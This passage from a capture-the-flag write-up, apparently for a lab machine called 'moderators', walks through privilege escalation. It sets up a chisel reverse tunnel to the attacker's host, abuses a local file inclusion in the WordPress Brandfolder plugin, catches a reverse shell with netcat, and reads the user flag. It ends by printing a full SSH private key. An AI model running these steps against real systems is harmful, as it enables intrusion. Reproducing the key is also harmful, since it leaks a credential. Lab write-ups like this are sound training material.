@@ -168,3 +168,138 @@ $
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@moderators:/tmp$ 
 ```
+
+lexi         877  0.0  0.8 228360 31968 ?        S    16:27   0:00      _ /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                 
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                             
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -  
+
+
+
+www-data@moderators:/tmp$ ls -la /opt/site.new
+ls -la /opt/site.new
+total 228
+drwxr-xr-x  5 lexi moderators  4096 Jul 14 10:50 .
+drwxr-xr-x  3 root root        4096 Jul 14 10:50 ..
+-rw-r--r--  1 lexi moderators   405 Sep 11  2021 index.php
+-rw-r--r--  1 lexi moderators 19915 Jan 29  2022 license.txt
+-rw-r--r--  1 lexi moderators  7437 Jan 29  2022 readme.html
+-rw-r--r--  1 lexi moderators  7165 Sep 11  2021 wp-activate.php
+drwxr-xr-x  9 lexi moderators  4096 Jul 14 10:50 wp-admin
+-rw-r--r--  1 lexi moderators   351 Sep 11  2021 wp-blog-header.php
+-rw-r--r--  1 lexi moderators  2338 Jan 29  2022 wp-comments-post.php
+-rw-r--r--  1 lexi moderators  3001 Jan 29  2022 wp-config-sample.php
+-rw-r--r--  1 lexi moderators  3004 Sep 11  2021 wp-config-sample.php.bak
+-rwxr-----  1 lexi moderators  3118 Sep 11  2021 wp-config.php
+drwxr-xr-x  6 lexi moderators  4096 Jul 14 10:50 wp-content
+-rw-r--r--  1 lexi moderators  3939 Sep 11  2021 wp-cron.php
+drwxr-xr-x 26 lexi moderators 12288 Jul 14 10:50 wp-includes
+-rw-r--r--  1 lexi moderators  2496 Sep 11  2021 wp-links-opml.php
+-rw-r--r--  1 lexi moderators  3900 Sep 11  2021 wp-load.php
+-rw-r--r--  1 lexi moderators 47916 Jan 29  2022 wp-login.php
+-rw-r--r--  1 lexi moderators  8582 Jan 29  2022 wp-mail.php
+-rw-r--r--  1 lexi moderators 23025 Jan 29  2022 wp-settings.php
+-rw-r--r--  1 lexi moderators 31959 Jan 29  2022 wp-signup.php
+-rw-r--r--  1 lexi moderators  4747 Sep 11  2021 wp-trackback.php
+-rw-r--r--  1 lexi moderators  3236 Sep 11  2021 xmlrpc.php
+
+
+```console
+└─$ chisel server --reverse --port 1235
+2022/10/07 16:35:37 server: Reverse tunnelling enabled
+2022/10/07 16:35:37 server: Fingerprint CLzmvEC7zbiS5jQUtTW0/FEXtHqVQ0MPDH+tiHS3PJw=
+2022/10/07 16:35:37 server: Listening on http://0.0.0.0:1235
+2022/10/07 16:35:50 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
+2022/10/07 16:36:11 server: session#2: Client version (1.7.7) differs from server version (0.0.0-src)
+2022/10/07 16:36:11 server: session#2: tun: proxy#R:8080=>localhost:8080: Listening
+```
+
+```console
+www-data@moderators:/tmp$ ./chisel2 client 10.10.16.19:1235 R:8080:localhost:8080
+<isel2 client 10.10.16.19:1235 R:8080:localhost:8080
+2022/10/07 21:36:11 client: Connecting to ws://10.10.16.19:1235
+2022/10/07 21:36:11 client: Connected (Latency 29.036943ms)
+```
+
+
+
+https://www.exploit-db.com/exploits/39591
+
+
+www-data@moderators:/tmp$ mkdir /var/www/html/logs/uploads/shell
+
+
+```
+www-data@moderators: mkdir -p /var/www/html/logs/uploads/wp/wp-admin/includes
+```
+```
+www-data@moderators: echo '<?php ?>' > wp-admin/includes/media.php
+echo '<?php ?>' > wp-admin/includes/file.php
+echo '<?php ?>' > wp-admin/includes/image.php
+echo '<?php ?>' > wp-admin/includes/post.php
+```
+
+http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/wp/
+
+```console
+└─$ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.16.19] from (UNKNOWN) [10.129.99.138] 33914
+bash: cannot set terminal process group (859): Inappropriate ioctl for device
+bash: no job control in this shell
+lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ cd 
+cd 
+lexi@moderators:~$ ls
+ls
+user.txt
+lexi@moderators:~$ cat user.txt
+cat user.txt
+9f60****************************
+```
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
